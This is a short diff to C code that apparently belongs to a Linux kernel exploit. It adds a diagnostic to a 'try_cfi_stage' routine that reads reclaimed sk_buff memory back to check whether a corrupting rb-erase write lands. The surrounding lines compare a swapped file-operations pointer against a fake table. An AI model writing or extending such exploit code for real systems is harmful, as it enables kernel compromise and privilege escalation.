@@ -471,6 +471,13 @@ int try_cfi_stage(void) {
             sr, errno, misc_fops, (unsigned long long)swap_chk, fake_fops,
             (int)(swap_chk == (uint64_t)fake_fops));
   }
+
+  /* SCRATCH_WRITE_DIAG: the rb-erase write was redirected to a page scratch;
+   * recv the reclaim sk_buffs (= the page) and diff vs the sent payload to prove
+   * whether the dequeue write lands at all (non-circular, no configfs needed). */
+  if (scratch_write_diag_enabled()) {
+    scratch_diag_readback((uint64_t)pselect_write_value());
+  }
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
     configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
